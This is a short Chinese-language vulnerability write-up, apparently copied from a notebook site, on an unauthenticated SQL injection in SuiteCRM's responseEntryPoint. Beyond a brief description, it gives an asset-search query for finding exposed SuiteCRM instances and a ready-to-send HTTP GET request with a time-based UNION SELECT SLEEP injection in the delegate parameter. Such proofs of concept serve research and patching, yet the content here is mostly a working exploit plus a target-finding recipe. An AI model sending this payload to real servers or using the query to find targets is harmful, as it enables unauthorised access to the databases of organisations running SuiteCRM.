# SuiteCRM responseEntryPoint存在SQL注入漏洞

# 一、漏洞简介
SuiteCRM存在SQL注入漏洞，未经身份验证的远程攻击者可以通过该漏洞拼接执行SQL注入语句，从而获取数据库敏感信息。

# 二、影响版本
+ SuiteCRM

# 三、资产测绘
```plain
title="SuiteCRM"
```

![1721616680565-4373451c-6a4b-4181-b8cc-42171ab43ac1.png](./img/xYNk3xzrkGpeK4r-/1721616680565-4373451c-6a4b-4181-b8cc-42171ab43ac1-982759.png)

# 四、漏洞复现
```plain
GET /index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

![1721616810604-b8692135-f0dd-4e90-bc63-5a59fa4a44c8.png](./img/xYNk3xzrkGpeK4r-/1721616810604-b8692135-f0dd-4e90-bc63-5a59fa4a44c8-002834.png)



> 更新: 2024-08-12 17:16:00  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/scs5n834l406n097>